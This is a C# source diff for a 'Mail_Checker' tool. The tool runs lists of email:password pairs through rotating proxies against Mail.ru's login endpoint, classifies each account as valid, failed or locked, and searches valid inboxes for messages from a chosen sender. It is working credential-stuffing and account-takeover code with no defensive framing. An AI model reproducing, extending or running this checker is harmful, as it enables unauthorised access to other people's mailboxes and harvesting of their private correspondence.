@@ -5,6 +5,10 @@ using Chilkat;
 using System.IO;
 using System.Text.RegularExpressions;
 
+
+
+
+
 namespace Mail_Checker
 {
 
@@ -24,10 +28,10 @@ namespace Mail_Checker
     class Checker
     {
 
-        public EventHandler<CheckEventArgs> OneCheckDone;
+        public event EventHandler<CheckEventArgs> OneCheckDone;
 
         char[] separs = { ':', ';' };
-        ConcurrentQueue<string> mails;
+        public ConcurrentStack<string> mails;
         ConcurrentQueue<ProxyStats> proxys;
         string query;
 
@@ -37,7 +41,7 @@ namespace Mail_Checker
 
         public Checker(string[] mails, string[] proxys, string query, int threads, int timeout)
         {
-            this.mails = new ConcurrentQueue<string>(mails);
+            this.mails = new ConcurrentStack<string>(mails);
 
             this.proxys = new ConcurrentQueue<ProxyStats>();
 
@@ -88,7 +92,7 @@ namespace Mail_Checker
             {
 
                 string mailLine;
-                mails.TryDequeue(out mailLine);
+                mails.TryPop(out mailLine);
                 string[] mailElements = mailLine.Split(separs);
                 if (mailElements.Length != 2) continue;
 
@@ -104,7 +108,7 @@ namespace Mail_Checker
                 if (proxyElements.Length != 2 || Regex.Matches(proxyElements[0], "((25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.){3}(25[0-5]|2[0-4]\\d|[01]?\\d\\d?)").Count == 0 ||
                     Regex.Matches(proxyElements[1], "^[0-9]*$").Count == 0)
                 {
-                    mails.Enqueue(mailLine);
+                    mails.Push(mailLine);
                     continue;
                 }
 
@@ -119,7 +123,7 @@ namespace Mail_Checker
                 if (error == CheckErrors.proxyError)
                 {
                     errors++;
-                    mails.Enqueue(mailLine);
+                    mails.Push(mailLine);
                     proxyLine.stats--;
                     if (proxyLine.stats > 0) proxys.Enqueue(proxyLine);
                 }
@@ -137,8 +141,7 @@ namespace Mail_Checker
                 else if (error == CheckErrors.connectError)
                 {
                     errors++;
-                    proxyLine.stats--;
-                    mails.Enqueue(mailLine);
+                    mails.Push(mailLine);
                     proxys.Enqueue(proxyLine);
                 }
 
@@ -152,7 +155,8 @@ namespace Mail_Checker
 
             }
 
-            
+
+
 
             workingThreads--;
 
@@ -202,7 +206,7 @@ namespace Mail_Checker
             http.SendCookies = true;
             http.SaveCookies = true;
             http.CookieDir = "memory";
-
+            http.MaxResponseSize = 100000;
 
             http.ConnectTimeout = timeout;
             http.ReadTimeout = timeout;
@@ -219,24 +223,32 @@ namespace Mail_Checker
             req.AddParam("saveauth", "0");
             req.Path = "/cgi-bin/auth?from=splash";
             req.HttpVerb = "POST";
+            
 
-
-
+            //логин-запрос
             HttpResponse resp = null;
             resp = http.SynchronousRequest("auth.mail.ru", 443, true, req);
 
+            //если пуст, то ошибка прокси
             if (resp == null)
             {
                 success = false;
                 error = CheckErrors.proxyError;
             }
-            else if (resp.BodyStr.Contains( mailElements[0] + "&fail=1"))
+            //если содержит фейл или блок, то ошибка почты
+            else if (resp.BodyStr.Contains( mailElements[0] + "&fail=1") || resp.BodyStr.Contains("почтовый ящик был взломан"))
             {
                 success = false;
                 error = CheckErrors.mailError;
             }
+            //если не содержит мейлру, то ошибка прокси
+            else if (!resp.BodyStr.Contains("inbox/?back=1"))
+            {
+                success = false;
+                error = CheckErrors.proxyError;
+            }
 
-
+            //поиск-запрос
             HttpResponse resp2 = null;
             if (success)
             {
@@ -244,30 +256,36 @@ namespace Mail_Checker
                 req2.HttpVerb = "GET";
                 req2.Path = "/search/";
                 req2.AddParam("q_from", query);
-
+                
                 resp2 = http.SynchronousRequest("e.mail.ru", 443, true, req2);
 
             }
-            if (error == CheckErrors.noError && resp2 == null)
+
+            //если пустой или не содержит поиска, то ошибка соединения
+            if (error == CheckErrors.noError && (resp2 == null || !resp2.BodyStr.Contains("SearchPerson")))
             {
                 success = false;
                 error = CheckErrors.connectError;
             }
 
 
+            //поиск сообщний
             if (success)
             {
-                success = resp2.BodyStr.Contains("Почта Mail.Ru");
+                MatchCollection foundCollection = Regex.Matches(resp2.BodyStr, "\"count\":.*");
+                if (foundCollection.Count > 0)
+                {
+                    string found = foundCollection[0].Value.Replace("\"count\":", "");
+                    messNum = Convert.ToInt32(found);
+                }
+                else messNum = 0;
+                //if (messNum != 0)
+                //{
+                //    File.CreateText("C:\\Users\\Max\\Desktop\\123\\" + mailElements[0]+"_1").Write(resp.BodyStr);
+                //    File.CreateText("C:\\Users\\Max\\Desktop\\123\\" + mailElements[0] + "_2").Write(resp2.BodyStr);
+                //}
             }
 
-            if (success)
-            {
-                messNum += Regex.Matches(resp2.BodyStr, "\"correspondents\":").Count;
-            }
-            else if (error == CheckErrors.noError)
-            {
-                error = CheckErrors.connectError;
-            }
 
             http.CloseAllConnections();
             http.Dispose();
